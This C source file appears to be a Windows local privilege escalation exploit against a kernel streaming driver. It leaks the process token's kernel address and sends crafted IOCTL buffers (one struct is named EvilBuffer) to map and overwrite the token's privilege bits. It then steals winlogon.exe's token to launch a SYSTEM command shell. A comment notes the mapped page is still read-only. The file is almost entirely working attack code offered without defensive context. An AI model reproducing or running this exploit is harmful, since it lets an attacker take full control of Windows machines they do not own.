#define __STREAMS__
#include "Types.h"
#include <ks.h>
#include <Dshow.h>
#include <ksproxy.h>

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ntdll.lib")

DEFINE_GUIDSTRUCT("3C0D501A-140B-11D1-B40F-00A0C9223196", KSNAME_Server);
#define KSNAME_Server DEFINE_GUIDNAMED(KSNAME_Server)
#define OFFSET_OF_TOKEN_PRIVILEGES 0x40

BOOL FSRegisterStream(HANDLE hDevice, uint32_t counter)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	HANDLE hEvent;
	InputBuffer inbuff = { 0 };

	uint32_t high = 0; // high 32 bits
	uint32_t low = counter; // low 32 bits

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	inbuff.Type = 2;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.qword18 = ((uint64_t)high << 32) | (uint64_t)low;
	inbuff.qword20 = 0;
	inbuff.hEvent = hEvent;

	//status = KsSynchronousDeviceControl(hDevice, IOCTL_RegisterStream, &inbuff, sizeof(inbuff), NULL, NULL, &dwbytesreturned);

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_RegisterStream, &inbuff, sizeof(InputBuffer), 0, 0);

	if (status == 0)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSRegisterStream failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}

BOOL FSInitializeStream(HANDLE hDevice, uint32_t counter)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	HANDLE hEvent;
	InputBuffer inbuff = { 0 };

	uint32_t high = 20; // high 32 bits
	uint32_t low = counter; // low 32 bits

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	inbuff.Type = 1;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.qword18 = ((uint64_t)high << 32) | (uint64_t)low;
	inbuff.qword20 = 0x0000000000040000;
	inbuff.hEvent = hEvent;


	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_InitializeStream, &inbuff, sizeof(InputBuffer), 0, 0);

	if (status == 0)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSInitializeStream failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}


BOOL FSInitializeContextRendezvous(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	DWORD dwbytesreturned = 0;
	//HRESULT status;
	
	MY_IRP inbuff = { 0 };

	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Type = 1;
	inbuff.Flags = 0x000000136FE7474D;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_IniContextRendezv, &inbuff, sizeof(MY_IRP), NULL, NULL);

	if (status == NOERROR)
	{
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSInitializeContextRendezvous failed with 0x%X\n", status);
		return FALSE;
	}
}

BOOL FSRendezvousServerRegisterContext(HANDLE hDevice)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;
	DWORD dwbytesreturned = 0;
	HANDLE hEvent;

	hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (hEvent == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateEventW failed\n");
		return FALSE;
	}

	MY_IRP inbuff = { 0 };

	inbuff.Type = 2;
	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
	inbuff.Flags = 0x000000136FE7474D;
	inbuff.hEvent = hEvent;

	//status = KsSynchronousDeviceControl(hDevice, IOCTL_RegisterContext, &inbuff, sizeof(MY_IRP), NULL, NULL, &dwbytesreturned);
	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_RegisterContext, &inbuff, sizeof(MY_IRP), NULL, NULL);

	if (status == NOERROR)
	{
		CloseHandle(hEvent);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] FSRendezvousServerRegisterContext failed with 0x%X\n", status);
		CloseHandle(hEvent);
		return FALSE;
	}
}

uint64_t GetTokenAddress()
{
	NTSTATUS status;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken = NULL;
	uint64_t tokenAddress = 0;
	ULONG ulBytes = 0;
	PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

	BOOL success = OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken);
	if (!success)
	{
		wprintf(L"[!] Couldn't open a handle to the current process token. (Error code: %d)\n", GetLastError());
		return 0;
	}
	// Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleTableInfo != NULL)
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}

		else
		{
			handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0)
	{
		// iterate over the system's handle table and look for the handles beloging to our process
		for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
		{
			// if it finds our process and the handle matches the current token handle we already opened, print it
			if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)currentToken)
			{
				tokenAddress = (uint64_t)handleTableInfo->Handles[i].Object;
				break;
			}
		}
	}
	else
	{
		if (handleTableInfo != NULL)
		{
			wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
			// Free memory and close handle before returning
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
			CloseHandle(currentToken);
			return 0; // Changed from 1 to 0
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);

	return tokenAddress;
}

BOOL PublishTx(HANDLE hDevice, uint64_t TokenAddr)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;

	EvilBuffer inbuffer = { 0 };
	PublishTxOut outbuffer = { 0 };

	inbuffer.size = sizeof(EvilBuffer);
	inbuffer.value = ((uint64_t)0x1 << 32) | (uint64_t)0x3;
	inbuffer.value2 = 0x1;
	inbuffer.virtualAddress3 = TokenAddr;
	inbuffer.size2 = ((uint64_t)0x1000 << 32) | (uint64_t)0x140;
	inbuffer.flags = ((uint64_t)0x1000000000000000) | (uint64_t)0x1;
	inbuffer.field14 = 0x438;

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_PublishTx, &inbuffer, sizeof(EvilBuffer), &outbuffer, sizeof(PublishTxOut));

	if (status == NOERROR)
	{
		wprintf(L"[+] PublishTx stats[txsize:%I64d,rxsize:%I64d,txcount:%d,rxcount:%d]\n", 
			outbuffer.txsize,
			outbuffer.rxsize,
			outbuffer.txcount,
			outbuffer.rxcount);
		return TRUE;
	}
	else
	{
		wprintf(L"[!] PublishTx failed with 0x%X\n", status);
		return FALSE;
	}
}

BOOL ConsumeTx(HANDLE hDevice, uint8_t **Addr)
{
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS status;

	ConsumeTxOut inbuffer = { 0 };

	// Allocate memory in user mode
	PVOID Inbuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Inbuffer == NULL) {
		wprintf(L"[!] VirtualAlloc failed with 0x%X\n", GetLastError());
		return FALSE;
	}
	
	wprintf(L"[+] VirtualAlloc buffer => %p\n", Inbuffer);

	inbuffer.size = 0x1000;
	inbuffer.value = 0x6;

	// Copy your structure to the allocated buffer
	memcpy(Inbuffer, &inbuffer, 0x30);

	status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_ConsumeTx, Inbuffer, sizeof(ConsumeTxOut), Inbuffer, sizeof(ConsumeTxOut));

	if (status == NOERROR)
	{
		// Copy the result back to your structure
		memcpy(&inbuffer, Inbuffer, 0x68);
		wprintf(L"[+] ConsumeTx stats[txsize:%I64d,rxsize:%I64d,txcount:%d,rxcount:%d]\n",
			inbuffer.txsize,
			inbuffer.rxsize,
			inbuffer.txcount,
			inbuffer.rxcount);
		*Addr = inbuffer.MdlVaAddress;
		return TRUE;
	}
	else
	{
		wprintf(L"[!] ConsumeTx failed with 0x%X\n", status);
		return FALSE;
	}
}

HANDLE OpenWinLogonProcess() 
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &pe32)) {
		CloseHandle(hSnapshot);
		return NULL;
	}

	do {
		if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			CloseHandle(hSnapshot);
			return hProcess;
		}
	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return NULL;
}

BOOL SpawnProcessWithParentHandle(const wchar_t* path, HANDLE hParent) {
	HANDLE hToken;
	if (!OpenProcessToken(hParent, TOKEN_DUPLICATE, &hToken)) {
		return FALSE;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);

	return CreateProcessWithTokenW(hToken, 0, path, NULL, 0, NULL, NULL, &si, &pi);
}

int main()
{

	uint64_t tokenAddress = 0;

	HANDLE DeviceH1, DeviceH2, DeviceH3;
	HRESULT hr;

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH1);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH2);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	hr = KsOpenDefaultDevice(KSNAME_Server, GENERIC_READ | GENERIC_WRITE, &DeviceH3);

	if (hr != NOERROR) {
		wprintf(L"Error: %ld\n", hr);
		return 1;
	}

	wprintf(L"[+] Successfully got a handle 1 => %p\n", DeviceH1);
	wprintf(L"[+] Successfully got a handle 2 => %p\n", DeviceH2);
	wprintf(L"[+] Successfully got a handle 3 => %p\n", DeviceH3);

	tokenAddress = GetTokenAddress();

	uint64_t privaddr = tokenAddress + OFFSET_OF_TOKEN_PRIVILEGES;

	if (tokenAddress)
	{
		wprintf(L"[+] Target process TOKEN address: %llx\n", tokenAddress);
		wprintf(L"[+] Target process _SEP_TOKEN_PRIVILEGES address: %llx\n", privaddr);
	}

	BOOL success = FALSE;


	success = FSInitializeContextRendezvous(DeviceH1);

	if (success)
	{
		wprintf(L"[^] InitializeContextRendezvous successfully\n");
	}
	

	success = FSInitializeStream(DeviceH2, 0);

	if (success)
	{
		wprintf(L"[^] FSInitializeStream successfully\n");
	}
	

	success = FSRegisterStream(DeviceH3, 0);

	if (success)
	{
		wprintf(L"[^] FSRegisterStream successfully\n");
	}
	
	success = PublishTx(DeviceH3, privaddr);

	if (success)
	{
		wprintf(L"[^] PublishTx successfully\n");
	}
	
	uint8_t *mappedAddress = NULL;

	success = ConsumeTx(DeviceH3, &mappedAddress);

	if (success)
	{
		wprintf(L"[^] ConsumeTx successfully\n");
	}

	uint64_t address = (uint64_t)mappedAddress;
	uint64_t baseAlignment = 0x1000;

	// Align the address
	uint64_t alignedAddress = address & ~(baseAlignment - 1);

	wprintf(L"[+] Aligned VA Base Address => %p\n", (void*)alignedAddress);
	wprintf(L"[+] VA Token Address => %p\n", mappedAddress);

	getchar();
	// The mapped page for some reason is Read only (Will fix it)
	memset(mappedAddress, 0xFF, 0x10);

	HANDLE hWinLogon = OpenWinLogonProcess();
	if (!hWinLogon) {
		wprintf(L"Failed to open winlogon process.\n");
		return 1;
	}

	if (!SpawnProcessWithParentHandle(L"C:\\Windows\\System32\\cmd.exe", hWinLogon)) {
		wprintf(L"Failed to spawn process.\n");
		CloseHandle(hWinLogon);
		return 1;
	}

	wprintf(L"Process spawned successfully.\n");

	CloseHandle(hWinLogon);
	
	return 0;
}